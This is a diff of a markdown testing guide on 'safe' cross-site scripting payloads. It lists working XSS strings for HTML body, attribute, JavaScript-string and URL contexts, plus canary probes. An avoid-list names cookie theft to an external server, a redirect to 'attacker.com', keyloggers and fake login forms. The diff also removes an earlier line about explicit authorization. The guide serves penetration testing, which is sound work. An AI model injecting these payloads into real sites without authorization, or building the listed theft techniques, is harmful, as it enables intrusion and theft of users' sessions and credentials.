@@ -1,18 +1,68 @@
-# Safe XSS Payloads
+# Safe XSS Payloads — Non-Destructive Testing
 
 ## Goals
-- Use minimal, non-destructive payloads for proof of execution.
-- Avoid data exfiltration or session theft without explicit authorization.
+- Prove JavaScript execution without causing harm
+- Non-destructive payloads only
+- Suitable for all target types including external
 
-## Safe Patterns
-- Basic proof: `<svg onload=alert(1)>`
-- DOM-based checks with harmless markers
+## Proof-of-Execution Payloads (Safe)
+```html
+<!-- Alert with domain (proves scope) -->
+<script>alert(document.domain)</script>
 
-## Avoid
-- Cookie or token exfiltration
-- Keylogging or phishing content
+<!-- Console log (silent, less disruptive) -->
+<script>console.log('XSS-PROOF:'+document.domain)</script>
 
-## Evidence Checklist
-- Payload used (redacted if needed)
-- Screenshot or response evidence
+<!-- Change page title (visual proof, no popup) -->
+<script>document.title='XSS-PROOF'</script>
 
+<!-- Inject visible text element -->
+<script>document.body.prepend(Object.assign(document.createElement('h1'),{textContent:'XSS-PROOF',style:'color:red;background:yellow;padding:10px'}))</script>
+```
+
+## Context-Specific Safe Payloads
+
+### HTML Body
+```html
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+```
+
+### HTML Attribute
+```html
+" onmouseover="alert(document.domain)
+" onfocus="alert(document.domain)" autofocus="
+"><script>alert(document.domain)</script>
+```
+
+### JavaScript String
+```javascript
+';alert(document.domain)//
+\';alert(document.domain)//
+</script><script>alert(document.domain)</script>
+```
+
+### URL/href
+```
+javascript:alert(document.domain)
+```
+
+## Canary Strings (Detection Without Execution)
+Inject these first to check for reflection and encoding:
+```
+xss<test>"'`/\
+<xss>test</xss>
+xss{{7*7}}
+```
+
+## Payloads to AVOID (Destructive)
+```
+DO NOT use without authorization:
+- Cookie theft: document.cookie sent to external server
+- Page defacement: overwriting document.body.innerHTML
+- Redirect: location.href = 'http://attacker.com'
+- Keyloggers: capturing user keystrokes
+- Credential harvesting: fake login forms
+- Network scanning: internal network probing
+```
